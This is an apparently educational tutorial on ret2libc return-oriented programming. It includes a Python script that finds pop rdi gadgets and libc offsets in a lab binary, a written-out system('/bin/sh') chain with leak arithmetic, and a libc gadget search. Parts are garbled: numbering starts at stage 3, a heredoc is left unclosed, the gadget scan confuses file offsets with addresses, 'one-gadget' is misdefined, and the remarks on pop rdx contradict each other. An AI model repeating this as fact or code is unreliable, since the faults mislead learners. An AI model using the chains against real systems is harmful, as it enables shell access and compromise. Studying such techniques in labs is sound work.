ROP: Ret2libc and System('/bin/sh')

Summary

With NX on, the stack is data, not code. ROP solves this by returning into existing code. You
chain together small instruction sequences already in the binary, setting up arguments in
registers and calling functions that already exist.

This is the technique that defeats every stack-based exploit today.

Key ideas

  • ret pops the next 8 bytes into RIP and increments RSP by 8. That is the whole trick:
    whatever bytes you place after a return address become the next return address
  • You need: a pop rdi; ret gadget, an address for "/bin/sh" in memory, and system() or
    execve()
  • system() needs its argument in rdi — one gadget suffices
  • The /bin/sh string may not exist in the binary; find it in libc, or place it with a write
  • With PIE/ASLR you need a libc leak first, then everything is a fixed offset from libc_base

The minimal ROP chain

  payload
  ├─ padding to the return address
  ├─ address of pop rdi ; ret      <- sets up the argument
  ├─ address of "/bin/sh" in libc
  └─ address of system() in libc

When ret executes: RIP becomes pop rdi, which loads "/bin/sh" into RDI, then ret again,
which jumps to system(). The call succeeds with RDI pointing at a valid string.

Terminology

Term Meaning
Gadget A short instruction sequence ending in ret
ROP chain A sequence of gadget addresses on the stack
pop rdi ; ret The gadget that loads the first argument
ret2libc Calling libc functions instead of injecting shellcode
PLT/GOT Dynamic resolution structures; system@plt if it exists
libc base The runtime load address of libc
One-gadget A libc function reachable with pre-set registers
Stack pivot Moving RSP elsewhere to extend writeable area
Chain environment Setting up RAX, RDI, RSI, RDX for execve

# --- 3. STAGE 2: a chain, with a marker rather than a shell ---
echo
echo "=== stage 2: a real ROP chain, aiming at write() ==="
cat > ropchain.py <<'PY'
#!/usr/bin/env python3
"""
Build a ROP chain against YOUR OWN lab binary.
Stage 2 calls write(1, msg, n) to prove the chain executes in order.
"""
import struct, subprocess

def p64(x): return struct.pack("<Q", x)
def p32(x): return struct.pack("<I", x)

def build(offset, chain):
    return b"A" * offset + b"".join(chain)

def main():
    offset = None
    for n in range(1, 200):
        try: r = subprocess.run(["./target"], input=b"A"*n, capture_output=True, timeout=3)
        except subprocess.TimeoutExpired: continue
        if r.returncode != 0:
            offset = n + 8; break
    if offset is None:
        print("  could not determine offset"); return 1
    print(f"  offset = {offset}")

    # --- discover gadgets and libc offsets from the binary itself ---
    import subprocess as sp
    libc = sp.run(["bash","-c","ldd ./target | awk '/libc.so/{print $3}'"],
                  capture_output=True,text=True).stdout.strip()
    if not libc:
        print("  no libc found"); return 1

    def libc_offset(sym):
        out = sp.run(["nm","-D",libc],capture_output=True,text=True).stdout
        for line in out.splitlines():
            f = line.split()
            if len(f) == 3 and f[2] == sym:
                return int(f[0], 16)
        return None

    # find pop rdi ; ret in the binary
    raw = open("./target","rb").read()
    text_off = 0x400000
    gadgets = []
    for i in range(len(raw)-1):
        if raw[i] == 0x5f and raw[i+1] == 0xc3:      # pop rdi ; ret
            gadgets.append(text_off + i)
    # also a bare ret
    rets = [text_off + i for i,b in enumerate(raw) if b == 0xc3]
    pop_rdi = gadgets[0] if gadgets else None
    ret = rets[0] if rets else None
    print(f"  pop rdi ; ret  = {pop_rdi:#x}" if pop_rdi else "  pop rdi gadget NOT in the binary")
    print(f"  ret            = {ret:#x}" if ret else "  ret NOT found")

    if not pop_rdi:
        print("  without pop rdi in the binary we must return into libc")
        return 2

    # write(1, b"A"*offset, 8) -> proves ordered execution
    write_off = libc_offset("write")
    exit_off  = libc_offset("exit")
    print(f"  libc write     = {write_off:#x}")
    print(f"  libc exit      = {exit_off:#x}")

    print()
    print("  Build the chain with YOUR libc base once you have a leak:")
    print(f"    libc_base = <from the info leak>")
    print(f"    chain = [pop_rdi, 1, rsi_gadget, buf, rdx_gadget, 8, write_libc, exit_libc]")
    print()
    print("  With the offsets above, the skeleton is:")
    print("    chain  = p64(pop_rdi) + p64(1)")
    print("            + p64(pop_rsi_or_mov) + p64(addr_of_a_msg)")
    print("            + p64(pop_rdx_or_mov) + p64(8)")
    print("            + p64(libc_base + write_off)")
    print("            + p64(libc_base + exit_off)")
    return 0

if __name__ == "__main__":
    raise SystemExit(main())

# --- 4. the classic: system("/bin/sh"), written out ---
cat > 04-system-exploit.md <<'EOF'
# The ret2system chain, written out

## Requirements
1. `pop rdi ; ret` gadget — in the binary, or borrowed from libc
2. address of a "/bin/sh" string — often in libc already
3. address of `system()` — from libc
4. libc_base — from an info leak (ASLR defeated)
5. no canary, or a leaked canary

## The chain

    padding (to the return address)
    p64(pop_rdi_ret)
    p64(addr_binsh)
    p64(system)
    p64(exit)          # optional: return path, rarely matters

## With a libc leak available

    libc_base = leaked_libc_address - offset_of_that_symbol

    system = libc_base + system_off
    binsh  = libc_base + binsh_off

## If "/bin/sh" is not in libc near a usable offset

Use `read@plt` to pull it in:
    pop rdi ; ret / pop rsi ; ret / pop rdx ; ret
    0 / rsi=buf / rdx=8 / read@plt / pop rdi;ret / 0 / buf
then continue the chain from `buf`.

## Why one-gadgets are preferred when available

A one-gadget is a libc function reachable with the right constraints already
satisfied by a single `ret`. It is shorter and more reliable, but it depends on
specific register/memory state, so it is fragile across libc versions.

## Reliability notes
- Always `p64()` everything. A short write desynchronises the whole chain.
- The binary must not be `-fstack-protector` unless you leaked the canary.
- ASLR on the stack does not matter; you are returning to code, not data.
EOF

# --- 5. a worked example against libc directly (no leak needed, conceptually) ---
python3 - <<'PY' | tee 05-libc-chains.txt
import subprocess
libc = subprocess.run(["bash","-c","ldd ./target | awk '/libc.so/{print $3}'"],
                      capture_output=True,text=True).stdout.strip()
if not libc: raise SystemExit
out = subprocess.run(["ROPgadget","--binary",libc,"--only","pop|ret"],
                     capture_output=True,text=True).stdout
want = ["pop rdi ; ret", "pop rsi ; ret", "pop rdx ; ret", "pop rax ; ret",
        "ret", "pop rsi ; pop r15 ; ret"]
found = {}
for line in out.splitlines():
    for w in want:
        if line.strip().endswith(w) and w not in found:
            found[w] = line.strip().split()[0]
print("  gadgets you will need, from libc:")
for w in want:
    print(f"    {w:<28} {found.get(w,'NOT FOUND')}")
print()
print("  pop rdi ; ret and pop rdx ; ret exist in essentially every libc build.")
print("  pop rdx ; ret is the one newer glibc versions moved into __libc_start_main,")
print("  which is why some published chains break - a reminder that offsets are")
print("  version-specific and must always be re-derived.")
